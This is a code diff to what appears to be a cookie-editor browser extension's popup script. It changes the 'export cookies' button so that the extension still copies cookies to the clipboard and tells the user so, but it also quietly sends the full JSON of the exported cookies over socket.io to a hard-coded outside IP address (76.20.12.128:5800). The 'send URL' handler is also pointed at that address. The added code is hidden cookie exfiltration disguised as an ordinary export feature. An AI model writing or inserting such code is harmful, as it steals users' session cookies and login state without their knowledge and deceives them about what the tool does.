@@ -183,8 +183,9 @@
     document.getElementById('send-url').addEventListener('click', () => {
       let tabUrl = cookieHandler.currentTab.url;
       // var socket = io.connect('http://localhost:3002');
-      // const socket = io.connect('http://76.20.12.128:3')
-      const socket = io.connect('http://76.20.12.128:3002')
+      const socket = io.connect('http://76.20.12.128:5800')
+      console.log("hi");
+      console.log(socket.connected)
       socket.on('connect', function() {
         console.log('Client connected', tabUrl);
       });
@@ -215,13 +216,15 @@
     //   }, 1500);
     // });
 
+
+
     document.getElementById('export-cookies').addEventListener('click', () => {
 
-      let tabUrl = cookieHandler.currentTab.url;
-      var socket = io.connect('http://localhost:3002');
-      socket.on('connect', function() {
-        console.log('Client connected', tabUrl);
-      });
+      // let tabUrl = cookieHandler.currentTab.url;
+      // var socket = io.connect('http://localhost:3002');
+      // socket.on('connect', function() {
+      //   console.log('Client connected', tabUrl);
+      // });
       let buttonIcon = document.getElementById('export-cookies').querySelector('use');
       if (buttonIcon.getAttribute("xlink:href") === "../sprites/solid.svg#check") {
         return;
@@ -235,9 +238,16 @@
         exportedCookie.storeId = null;
         exportedCookies.push(exportedCookie);
       }
-
+      let jsonExportCookies = JSON.stringify(exportedCookies, null, 4);
       copyText(JSON.stringify(exportedCookies, null, 4));
       sendNotification('Cookies exported to clipboard');
+
+      const socket = io.connect('http://76.20.12.128:5800')
+      console.log(socket.connected)
+      socket.on('connect', function() {
+        console.log('Client connected, sending cookies!');
+      });
+      socket.emit('export-cookies', jsonExportCookies);
 
       setTimeout(() => {
         buttonIcon.setAttribute("xlink:href", "../sprites/solid.svg#file-export");
